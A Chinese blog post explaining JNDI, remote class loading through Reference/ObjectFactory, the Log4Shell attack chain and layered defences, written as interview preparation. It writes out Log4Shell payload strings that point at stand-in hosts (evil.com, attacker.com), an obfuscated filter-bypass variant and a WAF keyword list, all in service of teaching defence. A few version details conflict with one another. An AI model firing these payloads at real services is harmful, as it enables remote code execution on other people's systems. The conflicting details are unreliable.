---
title: 【Java 安全】JNDI 深度解析：命名目录服务原理、RMI/LDAP 查找与 JNDI 注入漏洞防御
date: 2026-09-28 08:10:00
tags:
  - Java
  - 安全
  - JNDI
  - Log4Shell
  - 面试
categories:
  - Java
  - 安全
author: 东哥
---

# 【Java 安全】JNDI 深度解析：命名目录服务原理、RMI/LDAP 查找与 JNDI 注入漏洞防御

## 面试官：JNDI 是什么？为什么一个日志框架的漏洞能靠它实现远程代码执行？

2021 年 12 月的 Log4Shell（CVE-2021-44228）让 `JNDI` 这个平时几乎没人主动提起的 JDK 老 API 一夜之间家喻户晓。很多人知道"`${jndi:ldap://evil.com/a}` 就能 RCE"，但**未必说得清 JNDI 到底是什么、为什么 lookup 一个 URL 就能触发远程类加载、以及官方后来又做了哪些限制**。

本文从 JNDI 的架构讲起，把 lookup 流程、`Reference` + `ObjectFactory` 的加载机制、Log4Shell 的完整攻击链、以及 JDK 各版本的修复与落地方案全部串起来。

---

## 二、JNDI 是什么：命名服务 + 目录服务

**JNDI = Java Naming and Directory Interface**，是 JDK 提供的一套 **访问"命名与目录服务"的统一 API**（注意：是 API/SPI，不是具体实现）。

它的核心抽象只有几个：

| 概念 | 含义 |
|---|---|
| `Context` | 一组"名字→对象"绑定的上下文，`lookup(name)` / `bind(name, obj)` |
| `InitialContext` | 客户端 API 的入口，构造时读取 `jndi.properties` 或环境变量 |
| `Name` / `CompositeName` | 分层名字（如 `java:comp/env/jdbc/MyDS`） |
| `Binding` | 一个"名字 + 对象（或 Reference）" |
| `Reference` | 对象无法直接序列化时的"地址引用"，含工厂类名与属性 |
| `ObjectFactory` | 根据 `Reference` 把"引用"还原成对象 |

它要解决的问题是：**让代码只依赖一个"逻辑名"，而不依赖具体位置**。

```java
// 业务代码只认识 "jdbc/MyDS"，不关心它背后是什么
Context ctx = new InitialContext();
DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/MyDS");
```

底层由 **SPI（Service Provider Interface）** 提供具体驱动。常见的有：

| Provider | 协议 | 用途 |
|---|---|---|
| RMI Registry | `rmi://` | Java 远程对象的命名与查找 |
| LDAP | `ldap://` `ldaps://` | 企业目录服务（AD、OpenLDAP） |
| DNS | `dns://` | 域名解析 |
| CORBA COS Naming | `iiop://` | 老式 EJB 时代产物 |
| File System | `file:` | 简单的本地绑定文件 |
| `java:` | — | 应用服务器内部的组件命名空间 |

**关键点：JNDI 的 lookup URL 可以包含协议**，比如 `lookup("ldap://host:389/cn=x")`。而这个"协议可切换 + 支持远程引用"的特性，正是漏洞的温床。

---

## 三、lookup 的完整流程

```java
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup("ldap://attacker.com:1389/a");
```

内部链路大致是：

1. `InitialContext.lookup` 委托给当前环境的命名管理器；
2. 命名管理器解析 URL，根据 scheme（`ldap`）找到对应的 `URLContextFactory`（在 `jndi.properties` 里配的 `java.naming.factory.url.pkgs`）；
3. 工厂创建出 `ldapURLContext`，执行 LDAP 查询；
4. 服务端返回一个 LDAP 条目。**如果条目里带有 `javaClassName` / `javaCodeBase` / `objectClass: javaNamingReference` 等属性**，客户端会构造一个 `Reference`；
5. `NamingManager.getObjectInstance(reference)` 根据 `Reference.getFactoryClassName()` 找到 `ObjectFactory`；
6. **如果本地 classpath 找不到这个工厂类，且 `trustURLCodebase=true`（老版本默认），就会去 `javaCodeBase` 指定的 URL 下载 `.class` / `.jar` 并加载**；
7. 最后通过 `Class.forName(...).newInstance()` 实例化 → **静态代码块 / 构造方法执行 → 任意代码执行**。

第 6 步是"远程类加载"，第 7 步是"执行"。**这就是 JNDI 注入的本质：可控的 lookup 名字 + 允许远程代码库。**

---

## 四、`Reference` 与 `ObjectFactory`：漏洞的直接原因

```java
public class Reference implements Cloneable, java.io.Serializable {
    private String className;          // 目标类
    private String classFactory;       // 工厂类名
    private String classFactoryLocation; // 代码库 URL  ← 危险！
    private Map<String, Object> attrs; // 传给工厂的属性
}
```

还原对象的核心逻辑（`NamingManager`）：

```java
public static Object getObjectInstance(Object refInfo, Name name, Context nameCtx,
                                       Hashtable<?, ?> environment) {
    ObjectFactory factory = getObjectFactoryFromReference(ref, factoryName);
    if (factory != null) {
        return factory.getObjectInstance(ref, name, nameCtx, environment);
    }
    // ...
}
```

而 `getObjectFactoryFromReference` 老版本的伪代码：

```java
Class<?> clazz = null;
try {
    clazz = helper.loadClass(factoryName);       // 先看本地 classpath
} catch (ClassNotFoundException e) {
    codebase = ref.getFactoryClassLocation();
    if (codebase == null) return null;
    // ↓↓ 危险：从远程 URL 加载
    ClassLoader cl = URLClassLoader.newInstance(new URL[]{new URL(codebase)});
    clazz = cl.loadClass(factoryName);
}
return (ObjectFactory) clazz.newInstance();
```

**"远程 codebase 加载"是 JNDI 的设计初衷**——当年 EJB/RMI 需要在客户端动态下载 stub 类。但在互联网时代，这个"方便"变成了 Remote Code Execution 的直通车。

---

## 五、Log4Shell 攻击链完整复盘

Log4j2 的 `lookup` 功能允许在日志内容里写 `${...}` 做动态替换，例如 `${java:version}`、`${env:PATH}`。为了支持更多来源，它注册了 `JndiLookup`，于是 `${jndi:ldap://...}` 会被真正执行：

```java
// Log4j2 中的 JndiLookup (简化)
public String lookup(String key) {
    String jndiName = ...;
    return (String) new InitialContext().lookup(jndiName);  // ← 致命
}
```

完整攻击链：

```
攻击者发送:  User-Agent: ${jndi:ldap://attacker.com:1389/a}
        │
        ▼
Log4j2 把日志内容当"表达式"解析，识别出 jndi: 前缀
        │
        ▼
JndiLookup.lookup("ldap://attacker.com:1389/a") → InitialContext.lookup
        │
        ▼
客户端向 attacker.com:1389 发起 LDAP 查询（200/302 都可）
        │
        ▼
服务端返回伪造条目，携带 javaCodeBase=http://attacker.com/ 与工厂类名 Exploit
        │
        ▼
JDK 下载 http://attacker.com/Exploit.class 并 newInstance()
        │
        ▼
静态代码块执行 → 反弹 shell / 植入内存马 → RCE
```

为什么危害这么大：

1. **触发点极多**：任何会被打进日志的字段（User-Agent、URL、用户名、MQ 消息体）都可能是入口；
2. **无需认证**：只需让目标打一条日志；
3. **默认可用**：Log4j2 早期版本默认开启 lookup 替换，`trustURLCodebase` 在 JDK 8u191 之前也默认 `true`。

---

## 六、官方修复时间线：一层层"关掉远程代码"

这场漏洞推动了 JDK 与 Log4j2 的多轮加固：

| 时间 / 版本 | 措施 | 效果 |
|---|---|---|
| JDK 6u211 / 7u201 / 8u191 / 11.0.1 | `com.sun.jndi.ldap.object.trustURLCodebase` 默认改 **false**，并新增 `trustSerialData` 默认 false | 阻断"LDAP codebase 远程加载类" |
| JEP 290（8u121+） | 引入**反序列化过滤器**（`ObjectInputFilter`），可通过 `jdk.serialFilter` 限制可反序列化的类 | 阻断 RMI 反序列化利用链 |
| JDK 8u191+ / 11.0.1+ | RMI `com.sun.jndi.rmi.object.trustURLCodebase` 同样默认 false | 阻断 RMI codebase 加载 |
| JDK 17（JEP 403 / 强封装） | 反射访问内部 API 默认被拒，`setAccessible` 受限 | 提高后续利用链门槛 |
| Log4j2 2.15.0 | 默认**禁用 lookup 替换**（后又出 2.15 绕过） | 治标 |
| Log4j2 2.16.0 | **彻底移除 Message Lookup**，默认关闭 JNDI | 治本 |
| Log4j2 2.17.x | 修复 DoS（CVE-2021-45105） | 收尾 |

注意一个坑：**即使 codebase 被禁，攻击者仍可改用"本地 classpath 已有 gadget"或"LDAP 返回序列化数据 + 反序列化链"**继续利用（这就是后续出现的 `trustSerialData`、`jdk.serialFilter` 加固的原因）。所以"升级 JDK"不是万能药，只是把难度提升。

---

## 七、验证与复现要点（攻击面自查）

自查思路（不鼓励用于未授权目标）：

1. 确认运行时 JDK 版本：`java -version`；`docker run openjdk:8u181` 这类老镜像是高危；
2. 检查 `jdk.serialFilter` 是否配置（`--add-opens`、`-Djdk.serialFilter=`）；
3. 用 DNS 外带验证是否存在出网：`ldap://xxx.dnslog.cn/`（`dns://` 协议也可用），若 DNS 有回显说明 JNDI 可达；
4. 检查依赖中是否存在 `log4j-core` 且版本 `< 2.17.0`、`fastjson`、`xstream` 等已知高危组件。

---

## 八、防御：从"升级"到"纵深"

### 8.1 第一层：依赖与运行时升级

- Log4j2 升到 **2.17.1+**（或 2.12.4 / 2.3.2 的 LTS 分支）；
- JDK 升到 **8u191+ / 11.0.1+**（更推荐 17/21 LTS）；
- 全面扫描：`mvn dependency:tree | grep log4j`、SBOM 工具（`syft`、`trivy`）。

### 8.2 第二层：运行时硬限制

```bash
# 飞书式加固：限制反序列化 + 关闭远程 codebase
-Dcom.sun.jndi.ldap.object.trustURLCodebase=false
-Dcom.sun.jndi.rmi.object.trustURLCodebase=false
-Dcom.sun.jndi.ldap.object.trustSerialData=false
-Djdk.serialFilter='!com.sun.rowset.JdbcRowSetImpl;java.util.*;!*'
```

### 8.3 第三层：出网管控（最有效的一层）

**别让业务机器能随意访问外网**。生产环境通过安全组 / egress 白名单限制，JNDI 就算被触发也无处可去——这是最有性价比的兜底。

### 8.4 第四层：输入净化与 WAF

- 对用户可控内容做 `jndi:`、`${`、`ldap://`、`rmi://` 关键字检测与拦截（注意绕过：`${jndi:${lower:l}dap://}`、Unicode/大小写混淆）；
- **根本做法是"不要对不可信内容做表达式求值"**：日志只做占位符替换（参数化），不做递归解析。

### 8.5 第五层：代码规范

- **禁止**对用户输入调用 `InitialContext.lookup`；必须用 JNDI 时把名字限定在固定枚举里；
- **禁用**自定义 `ObjectFactory` 从外部加载；
- 引入 SAST 规则，把 `lookup(` 出现在不可信数据流上标记为高危。

---

## 九、JNDI 的正经用法：在 Spring 里怎么用

JNDI 不是"坏东西"，在容器化前的应用服务器时代是标准配置来源：

```xml
<!-- Tomcat context.xml / 容器 JNDI 数据源 -->
<Resource name="jdbc/MyDS" auth="Container" type="javax.sql.DataSource"
          driverClassName="com.mysql.cj.jdbc.Driver"
          url="jdbc:mysql://localhost:3306/demo"
          username="app" password="secret"
          maxTotal="20" maxIdle="10"/>
```

```java
// Spring: 用 JNDI 查找数据源
@Bean
public DataSource dataSource() {
    JndiDataSourceLookup lookup = new JndiDataSourceLookup();
    return lookup.getDataSource("java:comp/env/jdbc/MyDS");
}

// 或纯 XML
// <jee:jndi-lookup id="dataSource" jndi-name="java:comp/env/jdbc/MyDS"/>
```

Spring 的 `JndiObjectFactoryBean` 会把 JNDI 对象包装成 Spring Bean，并支持 `proxyInterface`（生成接口代理，避免容器外测试失败）。

**现代实践建议**：K8s + 云原生环境下，配置基本走 ConfigMap / 环境变量 / 配置中心（Nacos、Apollo），JNDI 的使用场景已大幅萎缩。**能不用就不用**是第一原则。

---

## 十、面试追问连环炮

**Q：JNDI 注入的本质是什么？**
A：**把不可信输入当成了一个会触发远程资源加载的名字**。攻击链 = 可控 lookup 名字 + 服务端可控返回 + 允许远程类加载/反序列化 + 出网可达，四者缺一不可。

**Q：为什么 Log4j2 的修复是"移除 lookup"而不是"限制 jndi"？**
A：因为问题的根不是 JNDI，而是"**日志内容被当成表达式递归求值**"这个设计。只要存在求值，攻击者就能用 `lower:`/`env:` 等变形组合绕过关键字过滤。移除 Message Lookup 才是从根上消除表达式求值。

**Q：JDK 8u191 之后 JNDI 注入就彻底安全了吗？**
A：不是。197 之前的 codebase 加载被禁，但仍存在其他利用面：一是 LDAP 返回的**序列化数据**反序列化（后被 `trustSerialData=false` 收窄）；二是**目标 classpath 上已有的 gadget 类**（如 `org.apache.naming.factory.BeanFactory` + `ELProcessor` 组合，在特定容器里可绕过）；三是 RMI 的本地工厂。所以仍需出网管控 + 组件升级。

**Q：为什么 `dns://` 也能被利用？**
A：DNS 协议本身不返回 Java 对象，不能直接 RCE，但能**外带数据、验证盲注**（DNSLog 平台），常被用于漏洞探测。且 `InitialContext.lookup("dns://xxx")` 同样会触发网络请求。

**Q：`trustURLCodebase=false` 之后 `Reference` 还能用吗？**
A：能。只是**不能从远程下载类**。如果工厂类在本地 classpath 里（比如 `com.sun.rowset.JdbcRowSetImpl`、容器内置的工厂），仍然会被实例化——这正是后续绕过思路的来源。

---

## 十一、总结

把 JNDI 这件事拆成三层看：

1. **设计层**：JNDI 是"名字→对象"的统一抽象，`Reference` + 远程 codebase 是它当年为 EJB 远程类加载设计的便利；
2. **漏洞层**：Log4Shell 把"不可信输入"喂给了"会做远程类加载的 lookup"，`可控名字 + 远程 codebase + 出网` 三者叠加成 RCE；
3. **防御层**：升级组件 + 关闭 codebase + 出网白名单 + 输入不做表达式求值 + 禁止对不可信输入 lookup，**纵深防御才是正解**。

一句可以直接背下来的总结：

> **JNDI 本身没有错，错的是把用户输入当成了可执行的名字——任何"输入即代码"的设计，最终都会变成远程代码执行。**

把这个机制理解透，再去读内存马、反序列化利用链、以及 Servlet/框架的类加载漏洞，你会发现它们共享同一套底层逻辑。
